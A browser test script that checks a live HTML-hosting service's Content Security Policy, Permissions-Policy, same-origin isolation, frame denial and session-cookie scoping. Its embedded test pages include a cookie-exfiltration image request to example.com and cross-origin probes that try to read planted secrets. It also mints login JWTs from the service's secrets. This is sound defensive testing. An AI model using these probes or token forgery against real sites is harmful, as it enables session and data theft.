// Browser-only P0 verification — runs against live https://*.sniplet.page.
//
// Usage:
//   set -a; source .secrets/secrets.env; set +a
//   node tests/browser/p0.mjs
//
// Exits 0 if all P0 pass, 1 otherwise.

import { chromium } from "playwright";
import { createHmac } from "node:crypto";
import { readFileSync } from "node:fs";

// ---------- helpers ----------

const API = "https://api.sniplet.page";

function loadSecrets() {
  const out = {};
  const text = readFileSync(".secrets/secrets.env", "utf8");
  for (const line of text.split("\n")) {
    const m = /^([A-Z_]+)=(.+)$/.exec(line);
    if (m) out[m[1]] = m[2];
  }
  return out;
}

function b64url(buf) {
  return Buffer.from(buf).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function hmacHex(secret, msg) {
  return createHmac("sha256", secret).update(msg).digest("hex");
}

function signJwt(claims, secret) {
  const header = { alg: "HS256", typ: "JWT" };
  const headerB = b64url(JSON.stringify(header));
  const payloadB = b64url(JSON.stringify(claims));
  const data = `${headerB}.${payloadB}`;
  const sig = createHmac("sha256", secret).update(data).digest();
  return `${data}.${b64url(sig)}`;
}

async function postJson(url, body) {
  const res = await fetch(url, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  let json;
  try { json = JSON.parse(text); } catch { json = { _raw: text }; }
  return { status: res.status, body: json };
}

async function deleteSniplet(slug, token) {
  const res = await fetch(`${API}/v1/sniplets/${slug}`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${token}` },
  });
  return res.status;
}

// ---------- test runner ----------

const results = []; // { name, ok, detail }
function record(name, ok, detail = "") {
  results.push({ name, ok, detail });
  const tag = ok ? "PASS" : "FAIL";
  console.log(`  [${tag}] ${name}${detail ? ` — ${detail}` : ""}`);
}

// ---------- HTML payloads ----------

const KITCHEN_SINK_HTML = `<!doctype html><html><head><meta charset="utf-8"></head><body>
<h1 id="title">kitchen sink</h1>
<div id="tw" class="flex items-center" style="border:1px solid red"></div>
<script>
  window.__r = {};
  // CSP: fetch external
  fetch("https://example.com/x").then(()=>window.__r.csp_fetch="ALLOWED").catch(e=>window.__r.csp_fetch="BLOCKED:"+(e&&e.name||"err"));
  // CSP: img exfil
  (function(){
    var i=new Image();
    i.onerror=function(){window.__r.csp_img="BLOCKED"};
    i.onload=function(){window.__r.csp_img="LOADED"};
    i.src="https://example.com/foo.png?"+encodeURIComponent(document.cookie||"nocookie");
  })();
  // Permissions-Policy: geolocation
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(){window.__r.pp_geo="ALLOWED"},
      function(err){window.__r.pp_geo="DENIED:"+err.code+":"+err.message},
      { timeout: 1000 }
    );
  } else {
    window.__r.pp_geo="NO_API";
  }
  // Permissions-Policy: camera (getUserMedia)
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({video:true})
      .then(()=>window.__r.pp_cam="ALLOWED")
      .catch(e=>window.__r.pp_cam="DENIED:"+e.name);
  } else {
    window.__r.pp_cam="NO_API";
  }
  // Permissions-Policy: payment
  try {
    new PaymentRequest([{supportedMethods:"basic-card"}], {total:{label:"t",amount:{currency:"USD",value:"1"}}});
    window.__r.pp_pay="ALLOWED";
  } catch (e) {
    window.__r.pp_pay="DENIED:"+e.name;
  }
  // SW registration (should fail due to nosniff + text/html MIME)
  if (navigator.serviceWorker) {
    navigator.serviceWorker.register("/")
      .then(()=>window.__r.sw="REGISTERED")
      .catch(e=>window.__r.sw="BLOCKED:"+e.name);
  } else {
    window.__r.sw="NO_API";
  }
</script>
<!-- Tailwind Play CDN -->
<script src="https://cdn.tailwindcss.com" onload="window.__r.tw_loaded=true" onerror="window.__r.tw_loaded='ERR'"></script>
<!-- cdnjs (allowed) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"
  onload="window.__r.cdnjs_loaded=true; window.__r.cdnjs_works=(typeof _==='function');"
  onerror="window.__r.cdnjs_loaded='ERR'"></script>
<!-- jsdelivr (blocked) -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.5/dist/purify.min.js"
  onload="window.__r.jsdelivr_loaded=true"
  onerror="window.__r.jsdelivr_loaded='ERR'"></script>
<!-- unpkg (blocked) -->
<script src="https://unpkg.com/lodash@4/lodash.min.js"
  onload="window.__r.unpkg_loaded=true"
  onerror="window.__r.unpkg_loaded='ERR'"></script>
</body></html>
`;

function crossOriginProbeHtml(targetSlug) {
  return `<!doctype html><html><body>
<h1>cross-origin probe</h1>
<script>
  window.__r = {};
  var target = "https://${targetSlug}.sniplet.page/";
  // SOP: fetch cross-origin → no CORS → opaque → blocked by CSP first anyway
  fetch(target, { mode: "cors" })
    .then(r => r.text())
    .then(t => window.__r.fetch = "READ:" + t.slice(0,30))
    .catch(e => window.__r.fetch = "BLOCKED:" + e.name);
  // SOP: window.open + read DOM
  try {
    var w = window.open(target, "popup");
    setTimeout(function(){
      try {
        var body = w.document.body.innerHTML;
        window.__r.winopen = "READ:" + body.slice(0,30);
      } catch (e) {
        window.__r.winopen = "BLOCKED:" + e.name;
      }
      try { w.close(); } catch(_){}
    }, 800);
  } catch (e) {
    window.__r.winopen = "OPEN_FAILED:" + e.name;
  }
</script>
</body></html>`;
}

// ---------- main ----------

async function main() {
  const secrets = loadSecrets();
  if (!secrets.MAGIC_JWT_SECRET || !secrets.EMAIL_HASH_SECRET) {
    console.error("missing secrets in .secrets/secrets.env");
    process.exit(2);
  }

  console.log("=== creating test sniplets ===");
  const created = [];

  // 1. kitchen-sink public sniplet
  const kr = await postJson(`${API}/v1/sniplets`, { html: KITCHEN_SINK_HTML, slug: "p0-kitchen" });
  if (kr.status !== 200) { console.error("kitchen sniplet create failed", kr); process.exit(2); }
  const kitchen = kr.body;
  created.push(kitchen);
  console.log(`  kitchen: ${kitchen.url}`);

  // 2. cross-origin target sniplet (small public)
  const tr = await postJson(`${API}/v1/sniplets`, {
    html: "<!doctype html><body><h1>target sniplet</h1><p>SECRET-ALPHA</p></body>",
    slug: "p0-target",
  });
  const target = tr.body;
  created.push(target);
  console.log(`  target:  ${target.url}`);

  // 3. probe sniplet (loads cross-origin attacks)
  const pr = await postJson(`${API}/v1/sniplets`, {
    html: crossOriginProbeHtml(target.slug),
    slug: "p0-probe",
  });
  const probe = pr.body;
  created.push(probe);
  console.log(`  probe:   ${probe.url}`);

  // 4. private sniplet for cookie test
  const TEST_EMAIL = "p0-test@example.com";
  const privR = await postJson(`${API}/v1/sniplets`, {
    html: "<!doctype html><body><h1>private p0</h1><p>SECRET-PRIVATE</p></body>",
    slug: "p0-private",
    viewers: [TEST_EMAIL],
  });
  const priv = privR.body;
  created.push(priv);
  console.log(`  private: ${priv.url}`);

  // 5. second private sniplet, same viewer (cross-sniplet session reuse)
  const priv2R = await postJson(`${API}/v1/sniplets`, {
    html: "<!doctype html><body><h1>private p0 #2</h1><p>SECRET-PRIVATE-2</p></body>",
    slug: "p0-private2",
    viewers: [TEST_EMAIL],
  });
  const priv2 = priv2R.body;
  created.push(priv2);
  console.log(`  private2: ${priv2.url}`);

  // ---------- launch browser ----------
  console.log("\n=== launching chromium ===");
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ ignoreHTTPSErrors: false });
  // Capture console for debugging
  context.on("page", (p) => {
    p.on("pageerror", (e) => console.log(`  [pageerror ${p.url()}]`, e.message));
    p.on("console", (msg) => {
      if (msg.type() === "error") console.log(`  [console.error ${p.url()}]`, msg.text());
    });
  });

  // ---------- TEST: kitchen sink ----------
  console.log("\n=== Test 1: CSP + Permissions-Policy + SW (kitchen sink) ===");
  const kp = await context.newPage();
  await kp.goto(kitchen.url);
  // Wait for async checks (geolocation timeout, fetch reject, etc.)
  await kp.waitForTimeout(2500);
  const r = await kp.evaluate(() => window.__r);
  console.log("  raw __r:", JSON.stringify(r, null, 2));

  record("CSP connect-src 'none' blocks fetch",
    typeof r.csp_fetch === "string" && r.csp_fetch.startsWith("BLOCKED"),
    `got ${r.csp_fetch}`);

  record("CSP img-src blocks https exfil",
    r.csp_img === "BLOCKED",
    `got ${r.csp_img}`);

  record("Permissions-Policy geolocation denied (no prompt)",
    typeof r.pp_geo === "string" && r.pp_geo.startsWith("DENIED"),
    `got ${r.pp_geo}`);

  record("Permissions-Policy camera denied",
    typeof r.pp_cam === "string" && r.pp_cam.startsWith("DENIED"),
    `got ${r.pp_cam}`);

  record("Permissions-Policy payment denied",
    typeof r.pp_pay === "string" && r.pp_pay.startsWith("DENIED"),
    `got ${r.pp_pay}`);

  record("Service Worker registration blocked",
    typeof r.sw === "string" && (r.sw.startsWith("BLOCKED") || r.sw.startsWith("ERR") || r.sw === "NO_API"),
    `got ${r.sw}`);

  record("CSP allowlist: cdnjs script loads + executes",
    r.cdnjs_loaded === true && r.cdnjs_works === true,
    `loaded=${r.cdnjs_loaded} works=${r.cdnjs_works}`);

  record("CSP allowlist: tailwindcss play CDN loads",
    r.tw_loaded === true,
    `tw_loaded=${r.tw_loaded}`);

  record("CSP block: jsdelivr script blocked",
    r.jsdelivr_loaded === "ERR" || r.jsdelivr_loaded === undefined,
    `got ${r.jsdelivr_loaded}`);

  record("CSP block: unpkg script blocked",
    r.unpkg_loaded === "ERR" || r.unpkg_loaded === undefined,
    `got ${r.unpkg_loaded}`);

  // Tailwind utility class actually applied?
  const twDisplay = await kp.evaluate(() => getComputedStyle(document.getElementById("tw")).display);
  record("Tailwind utility class applies (.flex → display:flex)",
    twDisplay === "flex",
    `display=${twDisplay}`);

  await kp.close();

  // ---------- TEST 2: SOP cross-sniplet ----------
  console.log("\n=== Test 2: SOP cross-sniplet (probe → target) ===");
  const pp = await context.newPage();
  await pp.goto(probe.url);
  await pp.waitForTimeout(2500);
  const pr2 = await pp.evaluate(() => window.__r);
  console.log("  raw __r:", JSON.stringify(pr2, null, 2));

  record("SOP: cross-sniplet fetch blocked (no SECRET leak)",
    typeof pr2.fetch === "string" && pr2.fetch.startsWith("BLOCKED") && !pr2.fetch.includes("SECRET-ALPHA"),
    `got ${pr2.fetch}`);
  record("SOP: window.open cross-origin DOM read blocked",
    typeof pr2.winopen === "string" && (pr2.winopen.startsWith("BLOCKED") || pr2.winopen.startsWith("OPEN_FAILED")) && !pr2.winopen.includes("SECRET-ALPHA"),
    `got ${pr2.winopen}`);

  await pp.close();

  // ---------- TEST 3: iframe XFO DENY ----------
  console.log("\n=== Test 3: iframe XFO DENY ===");
  const iframeHtml = `<!doctype html><body>
<iframe id="f" src="${target.url}/" onload="window.__loaded=true" onerror="window.__loaded='ERR'"></iframe>
<script>setTimeout(()=>{
  try {
    var f = document.getElementById("f");
    window.__bodyText = (f.contentDocument && f.contentDocument.body) ? f.contentDocument.body.textContent : "BLOCKED";
  } catch(e) { window.__bodyText = "BLOCKED:"+e.name; }
}, 1500);</script>
</body>`;
  const iframeR = await postJson(`${API}/v1/sniplets`, { html: iframeHtml, slug: "p0-iframe" });
  const iframeS = iframeR.body;
  created.push(iframeS);
  const ifp = await context.newPage();
  await ifp.goto(iframeS.url);
  await ifp.waitForTimeout(2500);
  const iframeBody = await ifp.evaluate(() => window.__bodyText);
  record("XFO DENY: iframe body unreadable / blocked",
    typeof iframeBody === "string" && iframeBody.startsWith("BLOCKED") && !iframeBody.includes("SECRET-ALPHA"),
    `got ${iframeBody}`);
  await ifp.close();

  // ---------- TEST 4: Cookie Domain + cross-sniplet session reuse ----------
  console.log("\n=== Test 4: Cookie Domain=sniplet.page + cross-sniplet session reuse ===");
  // Mint magic JWT for TEST_EMAIL
  const normEmail = TEST_EMAIL.trim().toLowerCase();
  const sub = hmacHex(secrets.EMAIL_HASH_SECRET, normEmail);
  const now = Math.floor(Date.now() / 1000);
  const magicJwt = signJwt({
    sub,
    purpose: "magic",
    iat: now,
    exp: now + 600,
    v: 1,
    jti: `p0-${Date.now()}`,
    return_to: priv.url + "/",
  }, secrets.MAGIC_JWT_SECRET);

  const ap = await context.newPage();
  // 4a. open the verify page (which doesn't consume) with the magic token
  await ap.goto(`https://sniplet.page/auth/verify?t=${encodeURIComponent(magicJwt)}`);
  await ap.waitForTimeout(500);
  // 4b. click Continue button to trigger /auth/consume
  await ap.click("#continue");
  // 4c. wait until redirect happens
  await ap.waitForURL(priv.url + "/", { timeout: 10000 });
  await ap.waitForTimeout(500);

  // Verify cookie set with Domain=sniplet.page
  const cookies = await context.cookies(["https://sniplet.page", priv.url, priv2.url]);
  const stCookie = cookies.find((c) => c.name === "st");
  record("Cookie 'st' set after consume",
    !!stCookie && !!stCookie.value,
    stCookie ? `domain=${stCookie.domain} httpOnly=${stCookie.httpOnly} sameSite=${stCookie.sameSite}` : "no cookie");
  record("Cookie Domain=sniplet.page (HttpOnly + Secure + SameSite=Lax)",
    !!stCookie && (stCookie.domain === ".sniplet.page" || stCookie.domain === "sniplet.page") &&
      stCookie.httpOnly === true && stCookie.secure === true,
    stCookie ? `domain=${stCookie.domain} httpOnly=${stCookie.httpOnly} secure=${stCookie.secure}` : "no cookie");

  // 4d. verify private sniplet shows actual content (not challenge)
  const privBody = await ap.evaluate(() => document.body.textContent || "");
  record("Private sniplet 1 serves content after consume",
    privBody.includes("SECRET-PRIVATE") && !privBody.includes("This sniplet is private"),
    `body[0:60]=${privBody.slice(0,60).trim()}`);

  // 4e. navigate to second private sniplet — same cookie, no re-auth
  await ap.goto(priv2.url + "/");
  await ap.waitForTimeout(500);
  const priv2Body = await ap.evaluate(() => document.body.textContent || "");
  record("Cross-sniplet session reuse: private2 serves without re-auth",
    priv2Body.includes("SECRET-PRIVATE-2") && !priv2Body.includes("This sniplet is private"),
    `body[0:60]=${priv2Body.slice(0,60).trim()}`);

  // 4f. negative test: clear cookie, verify challenge page returns
  await context.clearCookies();
  await ap.goto(priv.url + "/");
  await ap.waitForTimeout(500);
  const noCookieBody = await ap.evaluate(() => document.body.textContent || "");
  record("Without cookie: private shows challenge page",
    noCookieBody.includes("This sniplet is private") && !noCookieBody.includes("SECRET-PRIVATE"),
    `body[0:60]=${noCookieBody.slice(0,60).trim()}`);

  await ap.close();

  await browser.close();

  // ---------- cleanup ----------
  console.log("\n=== cleanup ===");
  for (const s of created) {
    const code = await deleteSniplet(s.slug, s.owner_token);
    console.log(`  DELETE ${s.slug}: ${code}`);
  }

  // ---------- summary ----------
  const passed = results.filter((r) => r.ok).length;
  const failed = results.length - passed;
  console.log(`\n=== Summary: ${passed} pass / ${failed} fail / ${results.length} total ===`);
  if (failed > 0) {
    console.log("\nFailures:");
    for (const r of results.filter((x) => !x.ok)) console.log(`  - ${r.name}: ${r.detail}`);
    process.exit(1);
  }
}

main().catch((e) => {
  console.error("FATAL:", e);
  process.exit(2);
});
